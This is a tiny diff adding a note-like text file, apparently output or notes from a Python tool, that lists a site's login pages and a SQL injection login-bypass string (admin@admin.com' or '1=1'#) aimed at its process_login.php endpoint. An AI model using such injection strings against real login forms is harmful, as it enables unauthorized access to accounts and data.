@@ -1,0 +1,6 @@
+python is done
+bm2.com
+http://bm2.com/bm2/login.php
+1
+http://bm2.com/bm2/includes/process_login.php-----------admin@admin.com' or '1=1'#
+here
